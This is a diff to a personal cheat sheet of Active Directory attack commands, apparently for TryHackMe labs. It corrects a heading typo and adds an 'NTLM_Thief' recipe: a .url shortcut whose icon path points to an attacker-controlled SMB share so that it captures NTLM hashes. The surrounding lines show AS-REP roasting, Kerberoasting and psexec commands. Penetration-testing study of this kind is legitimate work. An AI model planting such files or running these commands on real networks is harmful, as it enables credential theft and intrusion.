@@ -80,7 +80,7 @@ impacket-GetNPUsers vulnet-rst.local/ -no-pass -userfile users.txt
 ```
 impacket-psexec vulnnet-rst.local/a-whitehat@10.10.216.107
 ```
-## Impacker-GetUserSPNs
+## Impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
 ```
@@ -121,4 +121,13 @@ $> rpcclient -c enumprivs <target>    # List RPC services
 ```
 ldapsearch -x -h $ip -b base namingcontext
 ```
-
+# NTLM_Thief
+```
+┌──(ryan㉿kali)-[~/THM/Reset]
+└─$ cat >> shell.url
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\10.6.61.45\%USERNAME%.icon
+IconIndex=1
+```
